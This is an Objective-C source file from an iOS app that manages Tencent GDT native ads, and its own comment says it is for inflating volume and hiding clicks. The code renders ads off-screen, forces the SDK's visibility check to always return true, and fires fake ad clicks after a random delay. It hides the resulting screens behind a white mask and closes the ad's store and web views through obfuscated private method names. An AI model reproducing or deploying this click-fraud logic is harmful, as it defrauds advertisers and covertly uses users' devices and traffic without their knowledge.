//
//  GDTCpManager.m
//  grayWolf
//
//  Created by zengbiwang on 2017/6/27.
//
//

#import "GDTCpNativeManager.h"
#import "GDTMobBannerView.h"
#import "MajorSystemConfig.h"
#import "IQUIWindow+Hierarchy.h"
#import "helpFuntion.h"
#import "GDTNativeAd.h"
#import "AdvertGdtManager.h"
#import "GDtRootCtrl.h"
#import "CSPausibleTimer.h"
#import "AppDevice.h"
#import "UIImageView+WebCache.h"
#import <objc/runtime.h>
#define GdtAdvertIndex @"gdtAdvertIndex"
#ifdef OldGDTSDK
void test_GDTCp();
@interface GDTVisibilityUtil : NSObject
{
}
@end


@implementation GDTVisibilityUtil (Extend)
//+(char*)isViewVisible:(id)p1 adtype:(int)adtype
//{
//    return "0";
//}
+(BOOL)isViewVisible:(id)p1 adtype:(int)adtype
{
    return true;
}
@end
#endif
//跑量和隐藏点击

_GDTClickState _clickState = GDT_CLICK_unVaild;
static GDTCpNativeManager *g = NULL;
@interface GDTCpNativeManager()<GDTNativeAdDelegate>{
    GDTNativeAd *_nativeAd;     //原生广告实例
    GDTNativeAdData *_currentAd;//当前展示的原生广告数据对象
    UIView *_adView;            //当前展示的原生广告界面
    
    int _index;//广告序号
    // 业务相关
    BOOL _attached;
    
    BOOL _isAutoRefreshMode;
    
    BOOL _isClickBanner;
    BOOL _isCreateMaskView;
    UIView *_maskView;
    
    BOOL _isPostNotitifiBannerManagerChangeID;
}
@property(assign)BOOL isDelayClickState;//是否延迟加载的状态
@property(retain)CSPausibleTimer *maxClickOverTime;
@property(retain)CSPausibleTimer *chaoshiTimer;
@property(retain)CSPausibleTimer *updateTimer;//自动刷新
@property(retain)NSArray *_data;             //原生广告数据数组
@property(assign)UIViewController *rootCtrl;
@end
@implementation GDTCpNativeManager

+(GDTCpNativeManager*)getInstance{
    return NULL;
    if (!g) {
        g = [[GDTCpNativeManager alloc]init];
        if([MajorSystemConfig getInstance].appUserDebugAdID)
        {
            [MajorSystemConfig getInstance].gdtDelayDisplayTime = 5;
            [MajorSystemConfig getInstance].everyGDTDayTime = 5;
            [MajorSystemConfig getInstance].is_qq_Apl = true;
            
            [MajorSystemConfig getInstance].gdtAdInfo = [NSDictionary dictionaryWithObjectsAndKeys:@"1106541088",@"appkey",@"3090520708944896",@"placementId",@"xbberge.xbb.com",@"pkgname",@"熊宝贝儿歌",@"appname",@"1.0",@"vesion",nil];
        }
        
        test_GDTCp();
    }
    return g;
}

+(void)destoryInstance{
    [g unAllAsset];
    [g release];
    g = NULL;
}

-(void)unAllAsset{
    [self.maxClickOverTime pauseTimer];
    self.maxClickOverTime = nil;
    [((GDtRootCtrl*)[MajorSystemConfig getInstance].gdtRootCtrl) startOrStopCheck:false];
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(delayDism) object:NULL];
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(delayRemoveMaskView) object:NULL];
    [self.updateTimer invalidate];self.updateTimer = nil;
    [self.chaoshiTimer invalidate];self.chaoshiTimer = nil;
    [self stopAutoRefreshTimer];
    RemoveViewAndRelease(_maskView);
}

-(id)init{
    self = [super init];
    self.isDelayClickState = false;
    self.cpState = GDT_CpManager_FirstRequest;
    _index = [[[NSUserDefaults standardUserDefaults] objectForKey:GdtAdvertIndex] intValue];
    return self;
}

-(void)startAutoRefreshTimer{
    NSString *appKey = [[MajorSystemConfig getInstance].gdtAdInfo objectForKey:@"appkey"];
    NSString *placementId = [[MajorSystemConfig getInstance].gdtAdInfo objectForKey:@"placementId"];
    if (appKey&&placementId && !_nativeAd && self.rootCtrl) {
        _isAutoRefreshMode = true;
        [self addGDT:self.rootCtrl.view currentCtrl:self.rootCtrl appkey:appKey placementId:placementId];
    }
}

-(void)stopAutoRefreshTimer{
    _isAutoRefreshMode = false;
    [self unInitAd];
}

-(void)unInitAd{
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(randomClick) object:nil];
    RemoveViewAndRelease(_adView);
    [_nativeAd release];
    _nativeAd = nil;
    _attached = false;
    _currentAd = nil;
}

-(void)addGDT:(UIView*)parentView currentCtrl:(UIViewController*)currentViwController appkey:(NSString*)appKey placementId:(NSString*)placementId{
    [self unInitAd];
    _nativeAd = [[GDTNativeAd alloc] initWithAppkey:appKey placementId:placementId];
    if([MajorSystemConfig getInstance].isExcApla){
        _nativeAd.controller = [MajorSystemConfig getInstance].gdtRootCtrl;
    }
    else{//
        _nativeAd.controller =  currentViwController;
    }
    _nativeAd.delegate = self;
    [MajorSystemConfig getInstance].gdtPgkType = 0;
    [_nativeAd loadAd:10];
    [MajorSystemConfig getInstance].gdtPgkType = 1;
}

-(BOOL)showGDTCp:(UIView**)outView rootCtrl:(UIViewController*)rootCtrl{
    BOOL ret = false;//appkey placementId:placementId]
    NSString *appKey = [[MajorSystemConfig getInstance].gdtAdInfo objectForKey:@"appkey"];
    NSString *placementId = [[MajorSystemConfig getInstance].gdtAdInfo objectForKey:@"placementId"];
    [self stopAutoRefreshTimer];
    [self.updateTimer invalidate];self.updateTimer = nil;
    [self.chaoshiTimer invalidate];self.chaoshiTimer = nil;
    if (!appKey) {
        [self maxClickOvertDelay];
        return false;
    }
    if (appKey&&placementId && !_nativeAd) {
        self.rootCtrl = rootCtrl;
        _isAutoRefreshMode = false;
        [self addGDT:self.rootCtrl.view currentCtrl:[[UIApplication sharedApplication] keyWindow].rootViewController appkey:appKey placementId:placementId];
    }
    else{
        [MajorSystemConfig getInstance].is_qq_Apl = false;
    }
    
    if((![[AdvertGdtManager getInstance] isCanAutoShow] ) || (!_isAutoRefreshMode && [MajorSystemConfig getInstance].is_qq_Apl && !_isCreateMaskView && ![[helpFuntion gethelpFuntion]isValideOneDayNotAutoAdd:eveyrDayClickGDTAdertTimes(([NSString stringWithFormat:@"%@%@",[[MajorSystemConfig getInstance].gdtAdInfo objectForKey:@"placementId"],[AppDevice getInstance].deviceUID])) nCount:[MajorSystemConfig getInstance].everyGDTDayTime isUseYYCache:false time:nil]))
    {
        _isCreateMaskView = true;
    }
    if (_nativeAd && [MajorSystemConfig getInstance].is_qq_Apl && !_isCreateMaskView) {
        ret = true;
    }
    if(!ret)//本次启动已经自动点击，执行自动刷新广告
    {
        _isAutoRefreshMode = true;
        self.cpState = GDT_CpManager_AutoUpdate;
        if(!self.updateTimer){
            self.updateTimer = [CSPausibleTimer scheduledTimerWithTimeInterval:[MajorSystemConfig getInstance].gdtUpdateNativeTime target:self selector:@selector(autoUpdateTimeFun) userInfo:nil repeats:YES];
        }
        [self maxClickOvertDelay];
    }
    else{//超时处理
        self.cpState = GDT_CpManager_FirstRequest;
        if(!self.chaoshiTimer){
            self.chaoshiTimer = [CSPausibleTimer scheduledTimerWithTimeInterval:[MajorSystemConfig getInstance].gdtClickOvertime target:self selector:@selector(clickOvertime) userInfo:nil repeats:NO];
        }
    }
    
    return ret;
}

-(void)maxClickOvertDelay
{
    [self.maxClickOverTime invalidate];
    self.maxClickOverTime = nil;
    if ([MajorSystemConfig getInstance].isParallelClick) {
        if(!_isPostNotitifiBannerManagerChangeID){
            NotitifiBannerState//直接通知切换
            _isPostNotitifiBannerManagerChangeID = true;
        }
    }
}

-(void)clickOvertime
{
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(randomClick) object:nil];
    self.cpState = GDT_CpManager_AutoClickFaild;
    [self.chaoshiTimer invalidate];self.chaoshiTimer = nil;
    [self autoUpdateTimeFun];
    if(!self.updateTimer){
        self.updateTimer = [CSPausibleTimer scheduledTimerWithTimeInterval:[MajorSystemConfig getInstance].gdtUpdateNativeTime target:self selector:@selector(autoUpdateTimeFun) userInfo:nil repeats:YES];
    }
    [self maxClickOvertDelay];
    [[NSNotificationCenter defaultCenter]postNotificationName:@"gdt_chaoshiNotifi" object:nil];
}

-(void)autoUpdateTimeFun{
    NSString *appKey = [[MajorSystemConfig getInstance].gdtAdInfo objectForKey:@"appkey"];
    NSString *placementId = [[MajorSystemConfig getInstance].gdtAdInfo objectForKey:@"placementId"];
    [self addGDT:self.rootCtrl.view currentCtrl:[[UIApplication sharedApplication] keyWindow].rootViewController appkey:appKey placementId:placementId];
}

-(void)stopGDTAndRemove{
    
}

-(void)stopIfisClick{
    if(_isAutoRefreshMode)return;
    [self delayDism];
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(delayDism) object:nil];
    [_nativeAd release];_nativeAd = nil;
    [self startAutoRefreshTimer];
}

-(void)addJustBanner{
    
}
- (void)attachAd
{
    if (self._data && !_attached) {
        /*选择展示广告*/
        _index = (_index+1)%self._data.count;
        _currentAd = [self._data objectAtIndex:_index];
        Ivar iVar = class_getInstanceVariable([_currentAd class], "_urlScheme");
        id v = object_getIvar(_currentAd, iVar);
        if([v isKindOfClass:[NSString class]]){
            object_setIvar(_currentAd, iVar, nil);
        }
        [[NSUserDefaults standardUserDefaults] setObject:[NSNumber numberWithInt:_index]forKey:GdtAdvertIndex];
        [[NSUserDefaults standardUserDefaults]synchronize];
        /*开始渲染广告界面*/
        
        _adView = [[UIView alloc] initWithFrame:CGRectMake(([[UIScreen mainScreen] bounds].size.width-200)/2, ([[UIScreen mainScreen] bounds].size.height+2000), 200, 200)];
        _adView.layer.borderWidth = 1;
        _adView.backgroundColor = [UIColor clearColor];
        
        /*广告详情图*/
        UIImageView *imgV = [[[UIImageView alloc] initWithFrame:CGRectMake(2, 70, 316, 176)] autorelease];
        [_adView addSubview:imgV];
        [imgV sd_setImageWithURL:[NSURL URLWithString:[_currentAd.properties objectForKey:GDTNativeAdDataKeyImgUrl]]];
        /*广告Icon*/
        UIImageView *iconV = [[[UIImageView alloc] initWithFrame:CGRectMake(10, 5, 60, 60)] autorelease];
        [_adView addSubview:iconV];
        [iconV sd_setImageWithURL:[NSURL URLWithString:[_currentAd.properties objectForKey:GDTNativeAdDataKeyIconUrl]]];
        
        /*广告标题*/
        UILabel *txt = [[[UILabel alloc] initWithFrame:CGRectMake(80, 5, 100, 35)] autorelease];
        txt.text = [_currentAd.properties objectForKey:GDTNativeAdDataKeyTitle];
        [_adView addSubview:txt];
        
        /*广告描述*/
        UILabel *desc = [[[UILabel alloc] initWithFrame:CGRectMake(80, 45, 200, 20)] autorelease];
        desc.text = [_currentAd.properties objectForKey:GDTNativeAdDataKeyDesc];
        [_adView addSubview:desc];
        
        //这个app只能加载keywindow上面
        [[[UIApplication sharedApplication] keyWindow] addSubview:_adView];
        
        /*注册点击事件*/
        UITapGestureRecognizer *tap = [[[UITapGestureRecognizer alloc] initWithTarget:self action:@selector(viewTapped:)] autorelease];
        [_adView addGestureRecognizer:tap];
        /*
         * 广告数据渲染完毕，即将展示时需调用AttachAd方法。
         */
        [_nativeAd attachAd:_currentAd toView:_adView];
        _adView.alpha=1;
        _attached = YES;
        
        if (self.cpState != GDT_CpManager_AutoClickFaild) {
            if (  ( !_isAutoRefreshMode && !_isClickBanner && [MajorSystemConfig getInstance].is_qq_Apl && !_isCreateMaskView) && [[AdvertGdtManager getInstance] isCanAutoShow]) {//自动点击次数加1
                [[AdvertGdtManager getInstance]initClickInfo];
                if (![MajorSystemConfig getInstance].isParallelClick) {
                    [[AdvertGdtManager getInstance] isPasuseTimer:true];
                }
                [[helpFuntion gethelpFuntion]isValideOneDay:eveyrDayClickGDTAdertTimes(([NSString stringWithFormat:@"%@%@",[[MajorSystemConfig getInstance].gdtAdInfo objectForKey:@"placementId"],[AppDevice getInstance].deviceUID])) nCount:[MajorSystemConfig getInstance].everyGDTDayTime isUseYYCache:false time:nil];
                self.isDelayClickState = true;
                //随机点击时间
                [self.chaoshiTimer pauseTimer];
                [self.updateTimer pauseTimer];
                int delayTime = arc4random() % [MajorSystemConfig getInstance].maxClickTimeValue;
                printf("delayTime = %d\n",delayTime);
                [self performSelector:@selector(randomClick) withObject:nil afterDelay:delayTime];
            }
        }
    }
}

-(void)randomClick{
    if (![MajorSystemConfig getInstance].isDebugMode) {
        [self.chaoshiTimer resumeTimer];
        [self.updateTimer resumeTimer];
        [self viewTapped:nil];
    }
}

- (void)viewTapped:(UITapGestureRecognizer *)gr {
    /*点击发生，调用点击接口*/
    if([UIApplication sharedApplication].applicationState == UIApplicationStateActive){
    if( !_isAutoRefreshMode && [MajorSystemConfig getInstance].is_qq_Apl && !_isCreateMaskView && !_maskView){
        _isCreateMaskView = true;
        _clickState = GDT_CLICK_Vaild;
        //[MobClick event:@"nativeAdClickAd"];
        [_nativeAd clickAd:_currentAd];
        float w = 592,h=473;
        if (UI_USER_INTERFACE_IDIOM() == UIUserInterfaceIdiomPhone) {
            w/=2;h/=2;
        }
        _maskView = [[UIView alloc]initWithFrame:[[UIScreen mainScreen]bounds]];
        UIImageView *imageView = [[[UIImageView alloc]initWithFrame:CGRectMake((_maskView.bounds.size.width-w)/2,-h, w, h)] autorelease];
        imageView.image = [UIImage imageWithContentsOfFile:[[NSBundle mainBundle]pathForResource:@"root_q_cb" ofType:@"png"]];
        [_maskView addSubview:imageView];
        imageView.hidden = YES;
        [UIView animateWithDuration:[MajorSystemConfig getInstance].gdtDelayDisplayTime-0.1 animations:^{
            CGRect rect = imageView.frame;
            rect.origin.y = _maskView.bounds.size.height;
            imageView.frame = rect;
        }];
        _maskView.backgroundColor = [UIColor whiteColor];
        [[[UIApplication sharedApplication] keyWindow] addSubview:_maskView];
        if([MajorSystemConfig getInstance].isExcApla){
            _maskView.hidden = YES;
        }
        [((GDtRootCtrl*)[MajorSystemConfig getInstance].gdtRootCtrl) startOrStopCheck:true];
        [self performSelector:@selector(delayDism) withObject:nil afterDelay:[MajorSystemConfig getInstance].gdtDelayDisplayTime];
        [self performSelector:@selector(delayRemoveMaskView) withObject:nil afterDelay:[MajorSystemConfig getInstance].gdtDelayDisplayTime+0.5];
        [self.chaoshiTimer invalidate];self.chaoshiTimer = nil;
        self.cpState = GDT_CpManager_AutoClickSuccess;
        if ([MajorSystemConfig getInstance].isParallelClick && !self.maxClickOverTime) {
            self.maxClickOverTime = [CSPausibleTimer scheduledTimerWithTimeInterval:15 target:self selector:@selector(maxClickOvertDelay) userInfo:nil repeats:NO];
        }
    }
    else{
        [_nativeAd clickAd:_currentAd];
        //[MobClick event:@"nativeAdClickAd"];
    }
    }
}

#pragma mark --GDTNativeDelegate

/**
 *  原生广告加载广告数据成功回调，返回为GDTNativeAdData对象的数组
 */
-(void)nativeAdSuccessToLoad:(NSArray *)nativeAdDataArray{
    self._data = nativeAdDataArray;
    //[MobClick event:@"nativeAdSuccessID"];
    printf("nativeAdSuccessID = %s\n",[[[MajorSystemConfig getInstance].gdtAdInfo objectForKey:@"placementId"] UTF8String]);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        dispatch_async(dispatch_get_main_queue(), ^{
            [self attachAd];
        });
    });
}

/**
 *  原生广告加载广告数据失败回调
 */
-(void)nativeAdFailToLoad:(NSError *)error{
    self._data = nil;
    //[MobClick event:@"nativeAdFailToLoad"];
    printf("FailToLoad = %s error = %s\n",[[[MajorSystemConfig getInstance].gdtAdInfo objectForKey:@"placementId"] UTF8String],[[error description] UTF8String]);
}

/**
 *  原生广告点击之后将要展示内嵌浏览器或应用内AppStore回调
 */
- (void)nativeAdWillPresentScreen{
    printf("WillPresentScreen\n");
    //[MobClick event:@"WillPresentScreen"];
}

/**
 *  原生广告点击之后应用进入后台时回调
 */
- (void)nativeAdApplicationWillEnterBackground{
    printf("WillEnterBackground\n");
    RemoveViewAndRelease(_adView);
    _attached = false;
    _currentAd = nil;
    RemoveViewAndRelease(_maskView);
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(delayRemoveMaskView) object:nil];
    if(self.cpState == GDT_CpManager_AutoClickSuccess){
        self.cpState = GDT_CpManager_AutoUpdate;
        [self autoUpdateTimeFun];
        [[NSNotificationCenter defaultCenter]postNotificationName:@"gdt_chaoshiNotifi" object:nil];
        if(!self.updateTimer){
            self.updateTimer = [CSPausibleTimer scheduledTimerWithTimeInterval:[MajorSystemConfig getInstance].gdtUpdateNativeTime target:self selector:@selector(autoUpdateTimeFun) userInfo:nil repeats:YES];
        }
    }
    [self maxClickOverTime];
    _clickState = GDT_CLICK_unVaild;
}

/**
 * 原生广告点击以后，内置AppStore或是内置浏览器被关闭时回调
 */
- (void)nativeAdClosed
{
    printf("Closed...\n");
    //[MobClick event:@"nativeAdClosed"];
    if (![MajorSystemConfig getInstance].isParallelClick) {
        [[AdvertGdtManager getInstance] isPasuseTimer:false];
    }
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(delayDism) object:nil];
    RemoveViewAndRelease(_adView);
    _attached = false;
    _currentAd = nil;
    [NSObject cancelPreviousPerformRequestsWithTarget:self selector:@selector(delayRemoveMaskView) object:nil];
    RemoveViewAndRelease(_maskView);
    if(self.cpState == GDT_CpManager_AutoClickSuccess){
        [[NSNotificationCenter defaultCenter]postNotificationName:@"gdt_chaoshiNotifi" object:nil];
        //开始自动刷新
        self.cpState = GDT_CpManager_AutoUpdate;
        [self autoUpdateTimeFun];
        if(!self.updateTimer){
            self.updateTimer = [CSPausibleTimer scheduledTimerWithTimeInterval:[MajorSystemConfig getInstance].gdtUpdateNativeTime target:self selector:@selector(autoUpdateTimeFun) userInfo:nil repeats:YES];
        }
    }
    [self maxClickOvertDelay];
    _clickState = GDT_CLICK_unVaild;
}

//end

-(void)delayRemoveMaskView{
    RemoveViewAndRelease(_maskView);
}

-(void)delayDism{
    UIViewController *ctrl = [[[UIApplication sharedApplication] keyWindow] topMostController];
    NSString *str = NSStringFromClass([ctrl class]);
    if([str compare:[NSString stringWithFormat:@"GDTSt%@%@",@"oreProd",@"uctController"]]==NSOrderedSame)
    {
        NSString *strFuntion = [NSString stringWithFormat:@"_did%@%@",@"Fini",@"sh"];
        NSMethodSignature *sig=[NSClassFromString(@"SKStoreProductViewController") instanceMethodSignatureForSelector:NSSelectorFromString(strFuntion)];
        NSInvocation *invocation=[NSInvocation invocationWithMethodSignature:sig];
        [invocation setTarget:ctrl];
        [invocation setSelector:NSSelectorFromString(strFuntion)];
        [invocation invoke];
    }
    if([str compare:[NSString stringWithFormat:@"GDTSt%@uctLoa%@",@"oreProd",@"dingController"]]==NSOrderedSame)
    {
        NSMethodSignature *sig=[NSClassFromString([NSString stringWithFormat:@"GDTSt%@uctLoa%@",@"oreProd",@"dingController"]) instanceMethodSignatureForSelector:@selector(backEvent)];
        NSInvocation *invocation=[NSInvocation invocationWithMethodSignature:sig];
        [invocation setTarget:ctrl];
        [invocation setSelector:@selector(backEvent)];
        [invocation invoke];
    }
    if([str compare:[NSString stringWithFormat:@"GD%@bVie%@",@"TWe",@"wController"]] == NSOrderedSame)
    {
        NSMethodSignature *sig=[NSClassFromString([NSString stringWithFormat:@"GD%@bVie%@",@"TWe",@"wController"]) instanceMethodSignatureForSelector:@selector(popupDirectClose)];
        UIViewController *ctrl = [[[UIApplication sharedApplication] keyWindow] topMostController];
        NSInvocation *invocation=[NSInvocation invocationWithMethodSignature:sig];
        [invocation setTarget:ctrl];
        [invocation setSelector:@selector(popupDirectClose)];
        [invocation invoke];
    }
    [self performSelector:@selector(delayDism) withObject:nil afterDelay:0.5];
}
@end


